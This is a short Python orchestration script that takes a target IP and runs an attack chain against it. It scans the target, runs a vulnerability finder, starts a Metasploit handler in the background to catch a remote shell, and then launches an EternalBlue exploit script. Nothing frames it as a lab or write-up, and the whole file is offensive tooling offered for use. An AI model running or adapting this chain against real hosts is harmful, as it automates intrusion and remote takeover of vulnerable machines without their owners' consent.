import subprocess
import sys
import os

def run_script(script_path, args=None):
    cmd = ["python3", script_path]
    if args:
        cmd.extend(args)
    subprocess.run(cmd)

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 ToolBox.py <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]

    # Step 1: Run scanner.py
    print("\n[1] Scanning target...")
    run_script("scanner.py", [target_ip])

    # Step 2: Run vuln_finder.py
    print("\n[2] Finding vulnerabilities...")
    run_script("vuln_finder.py")

    # Step 3: Start listener in background
    print("\n[3] Starting shell listener...")
    handler_rc_path = os.path.abspath(os.path.join("every_exploits", "handler.rc"))
    listener_command = [
        "bash", "-c",
        "BUNDLE_GEMFILE=/opt/tools/metasploit-framework/Gemfile "
        "/usr/local/rvm/gems/ruby-3.1.5@metasploit-framework/wrappers/bundle exec "
        f"/opt/tools/metasploit-framework/msfconsole -r {handler_rc_path}"
    ]
    subprocess.Popen(listener_command)

    # Step 4: Run EternalBlue exploit
    print("\n[4] Running EternalBlue exploit...")
    run_script(os.path.join("every_exploits", "eternalblue.py"))

if __name__ == "__main__":
    main()
